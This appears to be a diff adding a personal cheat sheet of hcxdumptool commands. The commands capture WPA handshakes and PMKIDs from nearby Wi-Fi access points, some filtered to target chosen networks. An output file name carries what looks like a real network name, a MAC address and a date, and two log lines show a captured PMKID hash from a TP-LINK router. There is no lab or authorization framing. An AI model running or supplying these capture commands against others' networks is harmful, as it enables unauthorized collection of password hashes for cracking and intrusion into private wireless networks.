@@ -1,0 +1,25 @@
+hcxdumptool -o /root/hs/handshake_EBRALI_64-70-02-46-F6-2E_2020-03-23T20-10-28.cap -i wlan1 -t 6 --enable_status=3
+
+ hcxdumptool -o /root/hs/admins.pcapng -i wlan1 -t 6 --enable_status=3
+service network-manager restart
+1.1.1.1/userman
+
+hcxdumptool -o hash -i wlan1 --filterlist=filter.txt --filtermode=2 --enable_status=3
+
+================================
+
+hcxdumptool  -i wlan1 -o output.pcapng --enable_status=3 
+
+hcxdumptool -o output.pcapng -i wlan1 -t 5 --enable_status=3 
+
+#hcxdumptool -o hash -i wlan1 --filterlist_ap=filter.txt --filtermode=2 --enable_status=2
+
+hcxdumptool -o output.pcapng -i wlan1 --filterlist_ap=filter.txt --filtermode=2 --enable_status=1
+
+
+
+================================================
+
+#1fcc2336aff8e e8de27affef3 TP-LINK [PMKIDROGUE:f7b8544df737e3ff61a211291600a67e KDV:2]
+22:32:54   1 fcc2336aff8e e8de27affef3 TP-LINK [PMKIDROGUE:f7b8544df737e3ff61a211291600a67e KDV:2]
+
